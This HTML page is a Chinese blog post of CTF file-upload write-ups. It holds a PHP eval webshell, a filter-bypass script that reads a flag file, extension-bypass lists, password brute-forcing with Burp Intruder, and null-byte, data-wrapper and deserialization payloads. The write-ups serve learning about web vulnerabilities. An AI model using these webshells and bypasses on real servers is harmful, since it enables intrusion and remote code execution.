@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="文件上传(ichunqiu)12 过滤了php和&amp;lt;?&amp;lt;script language=&amp;quot;PHP&amp;quot;&amp;gt;$f=fopen(&amp;quot;../flag.&amp;quot;.strtolower(&amp;quot;PHP&amp;quot;),&amp;quot;r&amp;quot;);echo fread($f,filesize(&amp;quot;../flag.&amp;quot;.strtolower(&amp;quo">
+<meta name="keywords" content="CTF WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="file_upload 题型记录">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/file-upload-题型记录/index.html">
+<meta property="og:site_name" content="CH4SER&#39;ZONE">
+<meta property="og:description" content="文件上传(ichunqiu)12 过滤了php和&amp;lt;?&amp;lt;script language=&amp;quot;PHP&amp;quot;&amp;gt;$f=fopen(&amp;quot;../flag.&amp;quot;.strtolower(&amp;quot;PHP&amp;quot;),&amp;quot;r&amp;quot;);echo fread($f,filesize(&amp;quot;../flag.&amp;quot;.strtolower(&amp;quo">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637064/55803368-c5eeaf80-5b0c-11e9-862a-302f6cfafc88.png">
+<meta property="og:updated_time" content="2019-04-23T03:26:56.783Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="file_upload 题型记录">
+<meta name="twitter:description" content="文件上传(ichunqiu)12 过滤了php和&amp;lt;?&amp;lt;script language=&amp;quot;PHP&amp;quot;&amp;gt;$f=fopen(&amp;quot;../flag.&amp;quot;.strtolower(&amp;quot;PHP&amp;quot;),&amp;quot;r&amp;quot;);echo fread($f,filesize(&amp;quot;../flag.&amp;quot;.strtolower(&amp;quo">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637064/55803368-c5eeaf80-5b0c-11e9-862a-302f6cfafc88.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/22/file-upload-题型记录/">
+
+
+
+
+
+  <title>file_upload 题型记录 | CH4SER'ZONE</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CH4SER'ZONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">The quieter you become, the more you are able to hear</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/file-upload-题型记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ch4ser">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/40637063.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CH4SER'ZONE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">file_upload 题型记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T01:56:35+00:00">
+                2019-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/题型记录/" itemprop="url" rel="index">
+                    <span itemprop="name">题型记录</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="文件上传-ichunqiu"><a href="#文件上传-ichunqiu" class="headerlink" title="文件上传(ichunqiu)"></a>文件上传(ichunqiu)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 过滤了php和&lt;?</span><br><span class="line">&lt;script language=&quot;PHP&quot;&gt;$f=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&quot;r&quot;);echo fread($f,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));fclose($f);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="123-ichunqiu"><a href="#123-ichunqiu" class="headerlink" title="123(ichunqiu)"></a>123(ichunqiu)</h2><p>首先查看源码，发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 用户信息都在user.php里 --&gt;</span><br><span class="line">       &lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>访问<code>user.php</code>没有任何东西，怀疑是备份文件，访问<code>user.php.bak</code>，用<code>sublime</code>打开可以看见一堆账号。</p>
+<p>接下来，采用burpsuite的<code>intrude</code>功能来爆破，选择<code>battering raw</code>模式，不同模式的爆破原理如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sniper</span><br><span class="line">将字典里面的数值一次赋值给我们的多个参数去组合尝试，比如三个参数a、b、c，字典(1,2,3,4,5)，那么burp会先用a来替换字典里面的值，b、c保持原来的值，然后是b，然后是c</span><br><span class="line">battering raw</span><br><span class="line">同时将abc用赋值的字典来替代，是字典中的同一个数值</span><br><span class="line">pitch fork</span><br><span class="line">需要用户导入三个字典，a用字典1替换，b用字典2替换，c用字典3替换</span><br><span class="line">cluster bomb</span><br><span class="line">也需要导入三个字典，但是a用字典1替换完之后会接着用字典2和3，bc也是</span><br></pre></td></tr></table></figure></p>
+<p>看注释，用户名加上出生日期，这里的1999可能是提示，所以password这里就是密码的payload部分加上1999，爆破发现<code>lixiuyun</code>可以进入。<br>进入之后查看源代码，看见:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 存在漏洞需要去掉  --&gt;</span><br><span class="line">&lt;!-- &lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;</span><br><span class="line">&lt;/form&gt; --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>按下<code>f12</code>，右键点击网页对应的元素，选择<code>edit as html</code>然后将上传部分的代码去掉，这样我们就可以上传文件了。</p>
+<p>上传一句话：<code>&lt;?php eval($_GET[&#39;caidao&#39;])&gt;</code>，抓包并发送到repeater模块中，这样更好操作，点击go，提示只允许上传图片文件，将文件名<code>webshell.php</code>改成<code>webshell.jpg</code>，发送，提示文件名不合法，改成<code>webshell.jpg.php</code>，发送，提示文件名不能包含php，分别用以下后缀替换：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php2, php3, php4, php5, phps, pht, phtm, phtml</span><br></pre></td></tr></table></figure></p>
+<p>webshell.jpg.pht可以，然而返回文件内容不合法。</p>
+<p>随便发个东西上去。返回提示<code>/view.php</code>，进入，显示的是<code>file?</code></p>
+<p>然后file应该是参数，于是<code>/view.php?file=flag</code>，返回<code>filter:flag</code>，说明flag被过滤了，那么<code>/view.php?file=flflagag</code>，就拿到了flag.</p>
+<blockquote>
+<p>ps：不论是flag.php还是flag都要试一试。</p>
+</blockquote>
+<h2 id="easy-galaxy-jarvisoj"><a href="#easy-galaxy-jarvisoj" class="headerlink" title="easy galaxy(jarvisoj)"></a>easy galaxy(jarvisoj)</h2><p>打开网页，可以看见一个上传图片的页面，首先编写一个php脚本，改变后缀名为<code>jpg</code>，然后上传，但是显示只能上传jpg文件或者gif文件，怀疑是基于<code>MIME</code><br>来进行比较的，也就是根据<code>text/html</code>这种类型的格式去判断的，这种类型不能随便修改。这样子只能上传一张真正的图片了，但是可以在<code>上传的图片结尾加上图片
+木马</code>，如图(好像崩了)：</p>
+<p><img src="https://user-images.githubusercontent.com/40637064/55803368-c5eeaf80-5b0c-11e9-862a-302f6cfafc88.png" alt></p>
+<p>上传之后，回显得到图片的id，多猜一猜可以发现是在<br><code>http://web.jarvisoj.com:32785/uploads/1499355842.jpg</code>下面，然后再看看其他页面的url<br><code>http://web.jarvisoj.com:32785/index.php?page=view</code>尝试构造<code>http://web.jarvisoj.com:32785/index.php?page=uploads/1499355842.jpg</code>但是，页面显示说1499355842.jpg.php找不到，可以考虑<code>%00</code>来截断，尝试构造<code>http://web.jarvisoj.com:32785/index.php?page=uploads/1499355842.jpg%00</code>,然后就<br>出来了flag，但是如果是上传一个没有getshell的图片，他是不会弹出来flag的，大概他是去检测匹配了文件内容了吧，如果有getshell就出flag</p>
+<h2 id="buby-php-nex"><a href="#buby-php-nex" class="headerlink" title="buby php(nex)"></a>buby php(nex)</h2><p>打开网页代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $key=&gt;$value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value)) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'sorry'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hello = <span class="string">"index.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^welcome2nex$/'</span>, $_GET[<span class="string">'nex'</span>]) &amp;&amp; $_GET[<span class="string">'nex'</span>] !== <span class="string">'welcome2nex'</span>) &#123;</span><br><span class="line">    $hello = $_GET[<span class="string">"hello"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_get_contents($hello)!==<span class="string">'welcome2nex'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'sorry'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ov0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        highlight_file(<span class="string">"flag.php"</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctf = $_GET[<span class="string">"ctf"</span>];</span><br><span class="line">unserialize($ctf);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这里有几个知识点：</p>
+<blockquote>
+<p>当通过get和post的方法同时传递参数的时候，默认情况下post参数的value会覆盖get参数的value</p>
+</blockquote>
+<blockquote>
+<p>preg_match默认情况会忽略换行符</p>
+</blockquote>
+<blockquote>
+<p>常用写文件方式：1.get 参数为php://input ,post参数为传入内容;2. get 参数为data:text/plain,</p>
+</blockquote>
+<blockquote>
+<p>反序列化漏洞</p>
+</blockquote>
+<p>最终payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url:http://60.205.218.9:2028/?nex=welcome2nex%0a&amp;hello=data:text/plain,welcome2nex&amp;ctf=O:3:&quot;Ov0&quot;:0:&#123;&#125;</span><br><span class="line"></span><br><span class="line">post:nex=1&amp;hello=1&amp;ctf=1</span><br></pre></td></tr></table></figure></p>
+<p>注意，nex参数后面的换行符要进行<code>url编码</code>，否则无法识别</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/XSS-题型记录/" rel="next" title="XSS 题型记录">
+                <i class="fa fa-chevron-left"></i> XSS 题型记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/22/ch4ser-的-vim/" rel="prev" title="ch4ser 的 vim">
+                ch4ser 的 vim <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/40637063.jpg" alt="ch4ser">
+            
+              <p class="site-author-name" itemprop="name">ch4ser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ch4ser-go" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/ch4_ser" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传-ichunqiu"><span class="nav-number">1.</span> <span class="nav-text">文件上传(ichunqiu)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#123-ichunqiu"><span class="nav-number">2.</span> <span class="nav-text">123(ichunqiu)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-galaxy-jarvisoj"><span class="nav-number">3.</span> <span class="nav-text">easy galaxy(jarvisoj)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buby-php-nex"><span class="nav-number">4.</span> <span class="nav-text">buby php(nex)</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量: <span id="busuanzi_value_site_pv"></span>次
+    </span>
+
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ch4ser</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
